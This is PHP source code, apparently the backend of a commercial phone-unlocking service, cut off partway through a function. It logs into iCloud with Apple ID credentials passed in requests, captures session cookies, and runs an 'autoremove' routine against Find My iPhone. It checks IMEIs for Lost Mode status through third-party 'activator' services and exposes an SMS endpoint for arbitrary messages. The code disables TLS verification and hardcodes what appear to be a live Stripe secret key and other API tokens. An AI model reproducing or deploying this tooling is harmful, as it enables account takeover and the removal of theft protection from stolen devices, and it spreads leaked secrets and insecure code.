<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Mail\Mailable;
use Illuminate\Mail\Mailables\Content;
use Illuminate\Queue\SerializesModels;
use Illuminate\Mail\Mailables\Address;
use Illuminate\Mail\Mailables\Envelope;
use Illuminate\Support\Facades\Mail;
use App\Mail\EmergencyCallReceived;
use Carbon\Carbon;

class AutenticateAPI
{
//  $API = new AutenticateAPI();
    //        $VALIDATION = $API->authenticate($email, $pass);

  public $headers = array('Origin: https://www.icloud.com ', 'User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 ', 'Content-Type: text/plain ', 'Accept: */*', 'Referer: https://www.icloud.com/ ', 'Accept-Encoding: gzip, deflate ', 'Accept-Language: en-US,en;q=0.8 ');
  public $username;
  public $password;
  public $server;
  public $devices_list = array();

  private function deviceClass($modelo)
  {
    $models = array(
      "iPhone1,1" => "iPhone 1G",          //iPhone 1G
      "iPhone1,2" => "iPhone 3G",          //iPhone 3G
      "iPhone2,1" => "iPhone 3GS",         //iPhone 3GS

      "iPhone3,1" => "iPhone 4",           //iPhone 4 - AT&T
      "iPhone3,2" => "iPhone 4",           //iPhone 4 - Other carrier
      "iPhone3,3" => "iPhone 4",           //iPhone 4 - Other carrier
      "iPhone4,1" => "iPhone 4S",          //iPhone 4S

      "iPhone5,1" => "iPhone 5",           //iPhone 5
      "iPhone5,2" => "iPhone 5",           //iPhone 5
      "iPhone5,3" => "iPhone 5C",          //iPhone 5C
      "iPhone5,4" => "iPhone 5C",          //iPhone 5C
      "iPhone6,1" => "iPhone 5S",          //iPhone 5S
      "iPhone6,2" => "iPhone 5S",          //iPhone 5S
      "iPhone7,2" => "iPhone 6",          //iPhone 6

      "iPod1,1"   => "iPod 1st Gen",       //iPod Touch 1G
      "iPod2,1"   => "iPod 2nd Gen",       //iPod Touch 2G
      "iPod3,1"   => "iPod 3rd Gen",       //iPod Touch 3G
      "iPod4,1"   => "iPod 4th Gen",       //iPod Touch 4G
      "iPod5,1"   => "iPod 5th Gen",       //iPod Touch 5G

      "iPad1,1"   => "iPad 1",             //iPad Wifi

      "iPad2,1"   => "iPad 2",             //iPad 2 WiFi
      "iPad2,2"   => "iPad 2 Cellular",    //iPad 2 GSM
      "iPad2,3"   => "iPad 2 Cellular",    //iPad 2 CDMA
      "iPad2,4"   => "iPad 2",             //iPad 2 WiFi (Rev a)

      "iPad3,1"   => "iPad 3",             //iPad 3 WiFi
      "iPad3,2"   => "iPad 3 Cellular",    //iPad 3 GSM+CDMA
      "iPad3,3"   => "iPad 3 Cellular",    //iPad 3 GSM

      "iPad3,4"   => "iPad 4",             //iPad 3 WiFi
      "iPad3,5"   => "iPad 4 Cellular",    //iPad 3 GSM
      "iPad3,6"   => "iPad 4 Cellular",    //iPad 3 GSM+CMMA
      "iPad11,1"   => "iPad 5",    //iPad 5 GSM+CMMA

      "iPad4,1"   => "iPad Air",           //iPad Air WiFi
      "iPad4,2"   => "iPad Air Cellular",  //iPad Air Cellular

      "iPad2,5"   => "iPad mini",

      "MacBook8,1" => "MacBook",
      "iMac14,1"   => "iMac",
      "MacBookPro2,2" => "MacBook Pro",
    );



    foreach ($models as $clave => $valor) {
      if (strpos($modelo, $valor) !== false) {
        return $clave;
        break; // Terminamos el bucle una vez que encontramos la clave
      }
    }
  }
  public function Modelo($imei)
  {
    $respuesta = $this->POST("https://hollyrenew.website/modelo.php?imei=", $imei);
    return $respuesta;
  }
  public function idconstruct($username, $password)
  {
    $this->username = $username;
    $this->password = $password;
    $this->authenticate($username, $password);
  }
  public function authenticate($username, $password)
  {
    $response_valide = $_REQUEST['response']; // json or html

    $this->username = $username;
    $this->password = $password;
    // $url = 'https://setup.icloud.com/setup/ws/1/login';
    $url = "https://setup.icloud.com/setup/ws/1/accountLogin";
    $data = '{"apple_id":"' . $this->username . '","password":"' . $this->password . '","appName":"find","extended_login":rememberMe}';
    $response            = $this->Post($url, $data);
    $result              = $response[0];
    $result_with_headers = $response[1];
    $first = json_decode($result, true);
    if (isset($first["error"])) {

      if ($response_valide == "json") {
        echo json_encode($respuesta = array(["status" => "200", "response" => "FALSE"]));
      } else {
        echo "FALSE";
      }
      exit;
    } else {
      $this->server = $first["webservices"]["findme"]["url"];
      preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result_with_headers, $matches);
      $cookies = "";
      foreach ($matches[0] as $value) {
        $value = str_replace("Set-Cookie: ", "", $value);
        $cookies .= $value . "; ";
      }

      $this->headers[6] = "Cookie: " . $cookies;
      if ($response_valide == "json") {
        echo json_encode($respuesta = array(["status" => "200", "response" => "OK"]));
      } else {
        echo "OK";
      }
      exit;
    }
  }

  public function Post($url, $data)
  {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    //curl_setopt($ch, CURLOPT_PROXY, '127.0.0.1:8080');
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    $result = curl_exec($ch);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $result_with_headers = curl_exec($ch);
    return array(
      $result,
      $result_with_headers
    );
  }
}

class SistemaController extends Controller
{

    public function mesesTranscurridosDesdeRegistro($fechaRegistro)
    {
        // Supongamos que $fechaRegistro es la fecha de registro del usuario en formato 'Y-m-d H:i:s'
        $fechaRegistro = Carbon::parse($fechaRegistro);
        $hoy = Carbon::now();

        // Calcula la diferencia en meses
        $mesesTranscurridos = $hoy->diffInMonths($fechaRegistro);

        return $mesesTranscurridos;
    }


  public function POST($url, $data)
  {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    //curl_setopt($ch, CURLOPT_PROXY, '127.0.0.1:8080');
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    $result = curl_exec($ch);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $result_with_headers = curl_exec($ch);
    return $result;
  }

  public function Modelo($imei)
  {
    $myCheck["service"] = 0;
    $myCheck["imei"] = $imei;
    $myCheck["key"] = "KA0-67V-ISI-85Y-WVI-OGW-0MY-CGE";
    $ch = curl_init("https://api.ifreeicloud.co.uk");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $myCheck);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    $myResult = json_decode(curl_exec($ch));
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $myResult->response;
  }




  /**
   * Store a newly created resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function xiaomi_check(Request $request)
  {
    try {

      $modelo = $this->Modelo($request->imei);
      $respuesta = $this->POST("https://fastsendmx.com/api/checks/checkxiaomi.php?imei=$request->imei", $request->imei);

      $cadena_sin_nueva_linea = str_replace("Telefono", "Phone", $respuesta);
      $cadena_sin_nueva_linea1 = str_replace("Correo", "Email", $cadena_sin_nueva_linea);
      $cadena_sin_nueva_linea2 = str_replace("\n", "<br>", $cadena_sin_nueva_linea1);

      $response = str_replace("Bloqueo", "Lock Detail", $cadena_sin_nueva_linea2);

      if (strpos($modelo, "Redmi") !== false) {

        $pattern = "/Model:+(.*?)+Model Name:/s";

        if (preg_match($pattern, $modelo, $matches)) {
          $selectedText = $matches[0];
          $a = str_replace('Model:', '', $selectedText);
          $b = str_replace('<br>Model Name:', '', $a);
          $d = str_replace(' ', '', $b);
          $ch = curl_init("https://cdn.alsgp0.fds.api.mi-img.com/device-model-img/$d.png");
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
          curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
          curl_setopt($ch, CURLOPT_TIMEOUT, 60);
          $myResult = json_decode(curl_exec($ch));
          $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
          curl_close($ch);
          if ($httpcode != 404) {
            return " <center><img  height='100px' src='https://cdn.alsgp0.fds.api.mi-img.com/device-model-img/$d.png'><br>" . $modelo . "<br>" . $response . "</center>";
          } else {
            return "<center><img height='100px' src='https://cdn.alsgp0.fds.api.mi-img.com/device-model-img/Redmi9.png'><br>" . $modelo . "<br>" . $response . "</center>";
          }
        }
      } else {
        return "<center><img height='100px' src='https://cdn.alsgp0.fds.api.mi-img.com/device-model-img/Redmi9.png'><br>" . $modelo . "<br>" . $response . "</center>";
      }
    } catch (\Exception  $e) {
      return back()->with("<script>alert('Only IMEI is acepted please check it')</script>");
    }
  }
  /**
   * Display a listing of the resource.
   *
   * @return \Illuminate\Http\Response
   */
  public function plist_info()
  {
    return view('plist_info');
  }

  /**
   * Show the form for creating a new resource.
   *
   * @return \Illuminate\Http\Response
   */
  public function create()
  {
    //
  }

  /**
   * Store a newly created resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function sms(Request $request)
  {
        $phone=urlencode($request->phone);
        $msg=urlencode($request->msg);

    $curl = curl_init();
	curl_setopt_array($curl, [
		CURLOPT_URL => "https://semysms.net/api/3/sms.php",
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_ENCODING => "",
		CURLOPT_MAXREDIRS => 10,
		CURLOPT_TIMEOUT => 30,
		CURLOPT_SSL_VERIFYPEER => false,
		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_POSTFIELDS => "token=57b733c137a093e0437952bf5aa52fbb&device=337530&phone=%2B$phone&msg=$msg",
		CURLOPT_HTTPHEADER => [
			"Content-Type: application/x-www-form-urlencoded"
		],
	]);

	$response = curl_exec($curl);
	$err = curl_error($curl);

	curl_close($curl);

	#$response = curl_exec($curl);

	//return ['resp' => $response, 'err' => $err];
	echo "Success";
  }

  /**
   * Display the specified resource.
   *
   * @param  int  $id
   * @return \Illuminate\Http\Response
   */
  public function show($id)
  {
    //
  }

  /**
   * Show the form for editing the specified resource.
   *
   * @param  int  $id
   * @return \Illuminate\Http\Response
   */
  public function edit($id)
  {
    //
  }

  /**
   * Show the form for editing the specified resource.
   *
   * @param  int  $id
   * @return \Illuminate\Http\Response
   * @param  \Illuminate\Http\Request  $request
   */
  public function editardevice(Request $request, $id)
  {
    $equipo = \App\Equipo::find($id);
    $equipo->user_id = auth::user()->id;
    $equipo->serial = $request->get('serial1');
    $equipo->ip = $request->get('ip1');
    if (Auth::user()->rol == "admin") {
      $equipo->status = $request->get('status1');
      $equipo->pagado = $request->get('pagado1');
    }
    $equipo->save();
    return back();
  }

  /**
   * Show the form for editing the specified resource.
   *
   * @param  int  $id
   * @return \Illuminate\Http\Response
   * @param  \Illuminate\Http\Request  $request
   */
  public function editarusuario(Request $request, $id)
  {
    $equipo = \App\User::find($id);
    $equipo->name = $request->get('name2');
    $equipo->email = $request->get('email2');


    $equipo->Autoremove_Apple = $request->get('Autoremove_Apple');
    $equipo->Autoremove_Xiaomi = $request->get('Autoremove_Xiaomi');
    $equipo->Check_Xiaomi = $request->get('Check_Xiaomi');
    $equipo->Check_Carrier = $request->get('Check_Carrier');
    $equipo->Reader_Plist = $request->get('Reader_Plist');
    $equipo->Whatsapp = $request->get('Whatsapp');
    $equipo->Check_Fmi = $request->get('Check_Fmi');


    // $setting->inicio = $request->final2 . " 00:00:00";
    //    $setting->final = $request->inicio2 . " 00:00:00";
    $equipo->rol = $request->get('rol2');
    $equipo->save();
    return back();
  }
  /**
   * Update the specified resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @param  int  $id
   * @return \Illuminate\Http\Response
   */
  public function update(Request $request, $id)
  {
    //
  }

  /**
   * Update the specified resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @param  int  $id
   * @return \Illuminate\Http\Response
   */
  public function payment(Request $request)
  {
    $stripe = new \Stripe\StripeClient('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');
    echo $stripe->paymentLinks->retrieve(
      'plink_1NXfpsLGWHg2jWYuPt7bSIeG',
      []
    );
  }


  /**
   * Update the specified resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @param  int  $id
   * @return \Illuminate\Http\Response
   */
  public function payment_response(Request $request)
  {
    $stripe = new \Stripe\StripeClient('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');
    echo $stripe->webhookEndpoints->update(
      'we_1NXgRRLGWHg2jWYufDtVV2uP',
      ['url' => 'https://hollyrenew.website/new_endpoint']
    );
  }

  /**
   * Remove the specified resource from storage.
   *
   * @param  int  $id
   * @return \Illuminate\Http\Response
   */
  public function eliminardevice($id)
  {
    $admin = \App\Equipo::find($id);
    $admin->delete();
    return back();
  }
  /**
   * Remove the specified resource from storage.
   *
   * @param  int  $id
   * @return \Illuminate\Http\Response
   */
  public function eliminarusuario($id)
  {
    $admin = \App\User::find($id);
    $admin->delete();
    return back();
  }
  /**
   * Store a newly created resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function adduser(Request $request)
  {
    $setting =  new \App\User;
    $setting->name = $request->get('name');
    $setting->email = $request->get('email');

    $password = $request->get('password');
    $setting->password = bcrypt($password);
    $setting->rol = $request->get('rol');
    $setting->save();
    return back();
    //
  }


  /**
   * Store a newly created resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function addservicio(Request $request)
  {

    $setting =  new \App\Servicio;
    $setting->nombre = $request->get('nombre');
    $setting->precio = $request->get('precio');
    $setting->habilitado = $request->get('habilitado');
    $setting->save();
    return back();
    //
  }


  /**
   * Store a newly created resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function adddevice(Request $request)
  {
    try {
      $setting =  new \App\Equipo;
      $setting->user_id = $request->get('user_id');
      $setting->serial = $request->get('serial');
      $setting->ip = $request->get('ip');
      $setting->status = $request->get('status');
      $setting->pagado = $request->get('pagado');
      $setting->save();


      return back();
    } catch (Exception $e) {
      return back();
    }
    //
  }


  public function getUserIP()
  {
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
      $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
      $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
      $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
      $ip = $forward;
    } else {
      $ip = $remote;
    }

    return $ip;
  }
  /**
   * Remove the specified resource from storage.
   *
   * @param  int  $imei
   * @return \Illuminate\Http\Response
   */
  public function check_($imei)
  {

    $key = @"JKC-ALW-D43-ZB4-L79-POU-98E-VGI-BX";
    $ch = curl_init();
    $url = "http://ialdaz-activator.com/check/st.php?KEY=$key&imei=$imei";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    $result = strip_tags($result);
    curl_close($ch);
    return $result;

    if (strpos($result, 'unk.w.') == true) {
    } else if (strpos($result, 'Error: Invalid IMEI/Serial Number') == true) {
    }


    // si todo esta OK, vamos a buscar la respuesta que dice el Find My iPhone

    $var = explode('Find My iPhone:', $result);
    if (isset($var[1])) {
      $var2 = explode('<br>', $var[1]);
      $dd = $var2[0];
    } else {
      $dd = ""; // Asignar un valor predeterminado si el índice no existe
    }

    $var_1 = explode('iCloud Status:', $result);
    if (isset($var_1[1])) {
      $var_2 = explode('<br>', $var_1[1]);
      $dd_2 = $var_2[0];
    } else {
      $dd_2 = ""; // Asignar un valor predeterminado si el índice no existe
    }


    // resultado OFF, haremos que el OFF responda el label de color Verde
    if (strpos($dd, 'OFF') == true) {
      $device_result = @" Find My iPhone : <span style='color:green;'>OFF</span>";
    }


    // resultado OFF, haremos que el ON responda el label de color Rojo

    else if (strpos($dd, 'ON') == true) {
      $device_result = @"<br> Find My iPhone : <span style='color:red;'>ON</span> <br>";
    } else {
      // aqui si en la api no muestra si esta ON o off
      $device_result = @" <br>Find My iPhone : <span style='color:red;'>NoResponse</span><br>";
    }


    if (strpos($dd_2, 'Lost Mode') == true) {
      $status_result = @"<br> iCloud Status : <span style='color:red;'>Lost Mode</span><br>";
    } else {

      $status_result = @" <br>iCloud Status : <span style='color:green;'>Clean</span><br>";
    }

    // contador, verifica si es un IMEI/SN

    $contador = strlen($imei);

    if ($contador == "15" || $contador == "16") {
      $Message_sent = " IMEI : $imei";
    }

    if ($contador == "12") {

      $Message_sent = " Serial Number : $imei";
    }
    if ($contador == "10") {
      $Message_sent = " Serial Number : $imei";
    }

    if ($contador == "11") {
      $Message_sent = " Serial Number : $imei";
    }



    if (strpos(strval($this->checkI($imei)), 'iPhone 2G') !== false || strpos(strval($this->checkI($imei)), 'iPhone 3G') !== false) {
      $Imagen = '<img src="https://ipsw.me/assets/devices/iPhone1,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 4') !== false || strpos(strval($this->checkI($imei)), 'iPhone 4s') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone3,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 5') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone5,3.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 6') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone7,2.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 6s') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone8,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 1') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone8,4.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 7') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone9,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 8') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone10,4.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone X') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone10,6.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone XS') !== false || strpos(strval($this->checkI($imei)), 'iPhone XR') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone11,6.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 2020') !== false || strpos(strval($this->checkI($imei)), 'iPhone SE 2023') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone14,6.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 12') !== false || strpos(strval($this->checkI($imei)), 'iPhone 12 Pro') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone13,3.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 13') !== false || strpos(strval($this->checkI($imei)), 'iPhone 13 mini') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone14,5.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 14 Plus') !== false || strpos(strval($this->checkI($imei)), 'iPhone 14 Pro Max') !== false) {
      $Imagen = 'http://ialdaz-activator.com/ReadTokenOS/Models/15,3.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 14') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone14,8.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPod') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPod9,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'Apple Watch') !== false) {
      $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM977/en_US/apple-watch-se-240.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPad') !== false) {
      $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM966/en_US/ipad-pro11-2gen-240.png';
    } else if (strpos(strval($this->checkI($imei)), 'MacBook Pro') !== false) {
      $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
    } else {
      $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
    }


    //envio del mensaje






  }


  public function check_API(Request $request)
  {

    $imei = $request->imei;

    $key = @"JKC-ALW-D43-ZB4-L79-POU-98E-VGI-BX";
    $ch = curl_init();
    $url = "http://ialdaz-activator.com/check/st.php?KEY=$key&imei=$imei";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    $result = strip_tags($result);
    curl_close($ch);
    echo $result;

    if (strpos($result, 'unk.w.') == true) {
    } else if (strpos($result, 'Error: Invalid IMEI/Serial Number') == true) {
    }


    // si todo esta OK, vamos a buscar la respuesta que dice el Find My iPhone

    $var = explode('Find My iPhone:', $result);
    if (isset($var[1])) {
      $var2 = explode('<br>', $var[1]);
      $dd = $var2[0];
    } else {
      $dd = ""; // Asignar un valor predeterminado si el índice no existe
    }

    $var_1 = explode('iCloud Status:', $result);
    if (isset($var_1[1])) {
      $var_2 = explode('<br>', $var_1[1]);
      $dd_2 = $var_2[0];
    } else {
      $dd_2 = ""; // Asignar un valor predeterminado si el índice no existe
    }


    // resultado OFF, haremos que el OFF responda el label de color Verde
    if (strpos($dd, 'OFF') == true) {
      $device_result = @" Find My iPhone : <span style='color:green;'>OFF</span>";
    }


    // resultado OFF, haremos que el ON responda el label de color Rojo

    else if (strpos($dd, 'ON') == true) {
      $device_result = @" Find My iPhone : <span style='color:red;'>ON</span>";
    } else {
      // aqui si en la api no muestra si esta ON o off
      $device_result = @" Find My iPhone : <span style='color:red;'>NoResponse</span>";
    }


    if (strpos($dd_2, 'Lost Mode') == true) {
      $status_result = @" iCloud Status : <span style='color:red;'>Lost Mode</span>";
    } else {

      $status_result = @" iCloud Status : <span style='color:green;'>Clean</span>";
    }

    // contador, verifica si es un IMEI/SN

    $contador = strlen($imei);

    if ($contador == "15" || $contador == "16") {
      $Message_sent = " IMEI : $imei";
    }

    if ($contador == "12") {

      $Message_sent = " Serial Number : $imei";
    }
    if ($contador == "10") {
      $Message_sent = " Serial Number : $imei";
    }

    if ($contador == "11") {
      $Message_sent = " Serial Number : $imei";
    }



    if (strpos(strval($this->checkI($imei)), 'iPhone 2G') !== false || strpos(strval($this->checkI($imei)), 'iPhone 3G') !== false) {
      $Imagen = '<img src="https://ipsw.me/assets/devices/iPhone1,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 4') !== false || strpos(strval($this->checkI($imei)), 'iPhone 4s') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone3,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 5') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone5,3.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 6') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone7,2.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 6s') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone8,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 1') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone8,4.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 7') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone9,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 8') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone10,4.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone X') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone10,6.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone XS') !== false || strpos(strval($this->checkI($imei)), 'iPhone XR') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone11,6.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone SE 2020') !== false || strpos(strval($this->checkI($imei)), 'iPhone SE 2023') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone14,6.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 12') !== false || strpos(strval($this->checkI($imei)), 'iPhone 12 Pro') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone13,3.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 13') !== false || strpos(strval($this->checkI($imei)), 'iPhone 13 mini') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone14,5.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 14 Plus') !== false || strpos(strval($this->checkI($imei)), 'iPhone 14 Pro Max') !== false) {
      $Imagen = 'http://ialdaz-activator.com/ReadTokenOS/Models/15,3.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPhone 14') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPhone14,8.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPod') !== false) {
      $Imagen = 'https://ipsw.me/assets/devices/iPod9,1.png';
    } else if (strpos(strval($this->checkI($imei)), 'Apple Watch') !== false) {
      $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM977/en_US/apple-watch-se-240.png';
    } else if (strpos(strval($this->checkI($imei)), 'iPad') !== false) {
      $Imagen = 'https://km.support.apple.com/resources/sites/APPLE/content/live/IMAGES/0/IM966/en_US/ipad-pro11-2gen-240.png';
    } else if (strpos(strval($this->checkI($imei)), 'MacBook Pro') !== false) {
      $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
    } else {
      $Imagen = 'https://images.macrumors.com/t/MwgTEggiztXrvIN2l8bZny1f93M=/1600x/article-new/2013/09/2023-macbook-pro-transparent.png';
    }


    //envio del mensaje






  }




  // Checar el Modelo del Dispositivo
  public function checkI($imei)
  {


    try {
      $url2 = "https://iservices-dev.us/MyCheckAldazActivatorNEW/mymodelbot.php?imei=$imei";

      // realiza la petici贸n HTTPs utilizando cURL

      $ch2 = curl_init();
      curl_setopt($ch2, CURLOPT_URL, $url2);

      curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);

      $result = curl_exec($ch2);

      curl_close($ch2);

      $result = str_replace(['<b>', '</b>', 'Serial: ' . $imei . '', 'Brand:', 'Apple Manufacturer:', 'Apple Inc', 'IMEI Number: ' . $imei . '', 'Manufacturer: ', '/n'], '', $result);

      $result = str_replace(@"", "", $result);


      $var1 = explode('Model:', $result);

      if (isset($var1[1])) {
        $var2 = explode('<br>', $var1[1]);
        $model = $var2[0];
        return @"<br>Model: $model <br>";
      } else {
        return "<br>Model:iPhone  <br>";
      }
    } catch (Throwable $e) {
      return "<br>Model:Undefined <br>";
    }
  }


  /**
   * Store a newly created resource in storage.
   *
   * @param  \Illuminate\Http\Request  $request
   * @return \Illuminate\Http\Response
   */
  public function API_Plist(Request $request)
  {

    $ip = $this->getUserIP();
    $AppleID = $request->appleid;
    $pwd = base64_decode($request->password);
    $action = $request->action; // verify or remove
    $response = $request->response; // json or html or text
    $auth = $this->auth($ip);
    if ($auth == true) {
      $result =   app('\App\Http\Controllers\SistemaController')->plist($request);
      echo $result;
    } else {
      echo "Your Server IP $ip Not Registered With us Please Contact <a href='https://t.me/2'></a>";
    }
  }


  private function autoremove_pictures($AppleID = NULL, $Password = NULL)
  {
    try {
      $ip = $_SERVER["REMOTE_ADDR"];
      $key = "testkey";
      $pwd = base64_decode($Password);
      $login = "testkey";
      $statusUnlocked = "️Status: Unlocked ✅ ️\r\r\n <br><br> ";
      $statusFailed = "️Status: Failed ⛔  ️\r\r\n <br><br> Device is Online! ️\r\r\n <br>️\r";
      require_once('/home/holllyrenew/autoremove.hollyrenew.website/FindMyiPhone.php');

      $pwd = empty($pwd) ? null : $pwd;
      $AppleID = empty($AppleID) ? null : $AppleID;

      if (empty($pwd) || empty($AppleID)) {
        die('error params');
      }

      try {
        $FindMyiPhone = new \FindMyiPhone($AppleID, $pwd, true);
        //$FindMyiPhone = $_SESSION['fmi'];
        if (!$FindMyiPhone->loggedIn) {
          die('Apple ID Locked or Password Invalid!');
        }

        $FindMyiPhone->refresh_client();
        //dd($FindMyiPhone->loggedIn());
        $name = "juan";
